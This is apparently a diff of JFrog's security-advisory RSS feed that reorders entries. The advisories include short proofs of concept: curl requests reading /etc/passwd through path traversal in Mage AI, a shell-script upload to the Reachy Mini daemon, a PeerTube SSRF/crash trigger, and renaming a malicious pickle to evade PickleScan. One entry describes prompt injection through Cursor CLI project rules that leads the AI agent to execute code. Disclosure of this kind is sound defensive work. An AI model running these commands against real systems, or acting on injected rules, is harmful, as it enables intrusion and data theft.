@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Wed, 05 Aug 2026 09:25:46 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 05 Aug 2026 11:30:53 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -270,82 +270,6 @@ https://nvd.nist.gov/vuln/detail/CVE-2026-8461
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</guid>
-            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-55419, MEDIUM, The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API
-
-
-## Component
-
-reachy-mini (reachy_mini daemon)
-
-## Affected versions
-
-< 1.8.2
-
-## Description
-
-The Reachy Mini daemon exposes POST /api/media/sounds/upload without authentication or file validation. An unauthenticated attacker can upload arbitrary files (not only sound files) into /tmp/reachy_mini_sounds/<original_filename> on the daemon host. The handler in src/daemon/app/routers/media.py (upload_sound) strips path traversal from the filename but does not enforce an extension allow-list, content checks, or size limits. The daemon binds 0.0.0.0 by default and uses permissive CORS (allow_origins=["*"]), so the endpoint is reachable on every network interface the daemon is connected to. This issue is the first step in a documented compromise chain that also includes Bluetooth authentication bypass and Bluetooth directory traversal.
-
-## PoC
-
-<br>
-
-**Step 1 - Start the daemon**
-
-<br>
-
-```
-.venv/bin/mjpython -m reachy_mini.daemon.app.main --sim --no-media
-```
-
-<br>
-
-**Step 2 - Confirm a normal wav upload works**
-
-<br>
-
-```
-curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
-  -F "file=@/path/to/your/file.wav"
-```
-
-<br>
-
-**Step 3 - Upload an arbitrary shell script**
-
-<br>
-
-```
-curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
-  -F "file=@/path/to/your/script.sh"
-```
-<br>
-
-**Step 4 - Verify the file was written**
-
-<br>
-
-The script is stored under /tmp/reachy_mini_sounds/ with no authentication challenge and no type rejection, confirming unrestricted upload.
-
-## Vulnerability Mitigations
-
-Upgrade to reachy-mini 1.8.2 or later. The fix allow-lists sound extensions, caps upload size, and validates content with GStreamer so only playable audio is accepted (https://github.com/pollen-robotics/reachy_mini/pull/1209). Until then, restrict network access to the daemon (firewall port 8000) and do not expose the media upload API on untrusted networks.
-
-## References
-https://github.com/pollen-robotics/reachy_mini/security/advisories/GHSA-m2pc-3q4q-w6jr
-https://github.com/pollen-robotics/reachy_mini/commit/984c7723b3ec5da63f4e0a2bcf9f120ceb563e04
-https://github.com/pollen-robotics/reachy_mini/releases/tag/v1.8.2
-https://nvd.nist.gov/vuln/detail/CVE-2026-55419
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant]]></title>
             <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</link>
             <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</guid>
@@ -468,6 +392,82 @@ Upgrade or log in as root (or via sudo -i), then:
 https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-9v48-x3h2
 
 
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</guid>
+            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-55419, MEDIUM, The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API
+
+
+## Component
+
+reachy-mini (reachy_mini daemon)
+
+## Affected versions
+
+< 1.8.2
+
+## Description
+
+The Reachy Mini daemon exposes POST /api/media/sounds/upload without authentication or file validation. An unauthenticated attacker can upload arbitrary files (not only sound files) into /tmp/reachy_mini_sounds/<original_filename> on the daemon host. The handler in src/daemon/app/routers/media.py (upload_sound) strips path traversal from the filename but does not enforce an extension allow-list, content checks, or size limits. The daemon binds 0.0.0.0 by default and uses permissive CORS (allow_origins=["*"]), so the endpoint is reachable on every network interface the daemon is connected to. This issue is the first step in a documented compromise chain that also includes Bluetooth authentication bypass and Bluetooth directory traversal.
+
+## PoC
+
+<br>
+
+**Step 1 - Start the daemon**
+
+<br>
+
+```
+.venv/bin/mjpython -m reachy_mini.daemon.app.main --sim --no-media
+```
+
+<br>
+
+**Step 2 - Confirm a normal wav upload works**
+
+<br>
+
+```
+curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
+  -F "file=@/path/to/your/file.wav"
+```
+
+<br>
+
+**Step 3 - Upload an arbitrary shell script**
+
+<br>
+
+```
+curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
+  -F "file=@/path/to/your/script.sh"
+```
+<br>
+
+**Step 4 - Verify the file was written**
+
+<br>
+
+The script is stored under /tmp/reachy_mini_sounds/ with no authentication challenge and no type rejection, confirming unrestricted upload.
+
+## Vulnerability Mitigations
+
+Upgrade to reachy-mini 1.8.2 or later. The fix allow-lists sound extensions, caps upload size, and validates content with GStreamer so only playable audio is accepted (https://github.com/pollen-robotics/reachy_mini/pull/1209). Until then, restrict network access to the daemon (firewall port 8000) and do not expose the media upload API on untrusted networks.
+
+## References
+https://github.com/pollen-robotics/reachy_mini/security/advisories/GHSA-m2pc-3q4q-w6jr
+https://github.com/pollen-robotics/reachy_mini/commit/984c7723b3ec5da63f4e0a2bcf9f120ceb563e04
+https://github.com/pollen-robotics/reachy_mini/releases/tag/v1.8.2
+https://nvd.nist.gov/vuln/detail/CVE-2026-55419
 ]]></content:encoded>
         </item>
         <item>
@@ -1019,46 +1019,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
-            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
-
-## Component
-
-[Cursor CLI](https://github.com/cursor/cursor)
-
-## Affected versions
-
-( , 2025.09.17-25b418f)
-
-## Description
-
-Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
-
-The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
-
-
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are available for this issue
-
-## References
-
-[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[DSPy sandbox escape arbitrary file read]]></title>
             <link>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</link>
             <guid>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</guid>
@@ -1102,6 +1062,46 @@ No mitigations are supplied for this issue
 
 
 
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
+            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
+
+## Component
+
+[Cursor CLI](https://github.com/cursor/cursor)
+
+## Affected versions
+
+( , 2025.09.17-25b418f)
+
+## Description
+
+Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
+
+The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
+
+
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are available for this issue
+
+## References
+
+[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
 ]]></content:encoded>
         </item>
         <item>
@@ -1285,59 +1285,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[PickleScan Bypass via File Extension Mismatch allows for evasion of malicious file detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Input Validation vulnerability in the scanning logic of mmaitre314 picklescan versions up to and including 0.0.30 allows a remote attacker to bypass pickle files security checks by supplying a standard pickle file with a PyTorch-related file extension. When the pickle file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability exists in the `scan_bytes` function, which prioritizes file extension checks. If a file has a PyTorch-related extension (e.g., `.bin`), the scanner attempts to parse it using the `scan_pytorch` function. When a standard pickle file is given such an extension, this PyTorch-specific parsing fails. Crucially, the scanner then returns an error without falling back to a standard pickle analysis (`scan_pickle_bytes`). This logic gap allows a malicious standard pickle file, disguised with a mismatched extension, to evade detection.
-
-## PoC
-
-The following steps demonstrate how to bypass the scanner.
-
-```bash
-# 1. Download a known malicious pickle file.
-wget https://huggingface.co/kzanki/regular_model/resolve/main/model.pkl?download=true -O model.pkl
-
-# 2. Scan the original file. PickleScan correctly detects the threat.
-# Output will contain: dangerous import 'builtins exec' FOUND
-picklescan -p model.pkl
-
-# 3. Rename the file with a PyTorch-related extension.
-cp model.pkl model.bin
-
-# 4. Scan the renamed file.
-# The scan will fail with a PyTorch parsing error and NOT detect the malicious payload.
-picklescan -p model.bin
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
@@ -1433,6 +1380,59 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[PickleScan Bypass via File Extension Mismatch allows for evasion of malicious file detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Input Validation vulnerability in the scanning logic of mmaitre314 picklescan versions up to and including 0.0.30 allows a remote attacker to bypass pickle files security checks by supplying a standard pickle file with a PyTorch-related file extension. When the pickle file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability exists in the `scan_bytes` function, which prioritizes file extension checks. If a file has a PyTorch-related extension (e.g., `.bin`), the scanner attempts to parse it using the `scan_pytorch` function. When a standard pickle file is given such an extension, this PyTorch-specific parsing fails. Crucially, the scanner then returns an error without falling back to a standard pickle analysis (`scan_pickle_bytes`). This logic gap allows a malicious standard pickle file, disguised with a mismatched extension, to evade detection.
+
+## PoC
+
+The following steps demonstrate how to bypass the scanner.
+
+```bash
+# 1. Download a known malicious pickle file.
+wget https://huggingface.co/kzanki/regular_model/resolve/main/model.pkl?download=true -O model.pkl
+
+# 2. Scan the original file. PickleScan correctly detects the threat.
+# Output will contain: dangerous import 'builtins exec' FOUND
+picklescan -p model.pkl
+
+# 3. Rename the file with a PyTorch-related extension.
+cp model.pkl model.bin
+
+# 4. Scan the renamed file.
+# The scan will fail with a PyTorch parsing error and NOT detect the malicious payload.
+picklescan -p model.bin
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
 ]]></content:encoded>
         </item>
         <item>
@@ -2468,72 +2468,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (insert the user token in the proper place):
-
-   ```
-   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
-   ```
-
-   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</guid>
@@ -2865,6 +2799,72 @@ curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/p
 The .m3u8 file will be returned.
 
 
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
+
+It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
+
+   ```
+   python malicious_rest_server.py
+   ```
+
+   This will start a server listening on port 1234.
+
+1. In another terminal, run the following command (insert the user token in the proper place):
+
+   ```
+   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
+   ```
+
+   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
 
 ## Vulnerability Mitigations
 
@@ -3222,6 +3222,50 @@ No references are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI pipeline interaction request remote arbitrary file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45190, MEDIUM, Mage AI pipeline interaction request remote arbitrary file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI pipeline interaction request remote arbitrary file leak
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Pipeline Interaction" request
+
+## PoC
+
+```bash
+curl -X GET
+'http://localhost:6789/api/pipelines/example_pipeline/interaction/..%2F..%2F..%2
+F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
+<USER TOKEN>'
+```
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
@@ -3250,49 +3294,6 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 curl -X GET
 'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
 <USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI git content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45189, MEDIUM, Mage AI git content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI git content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Git Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
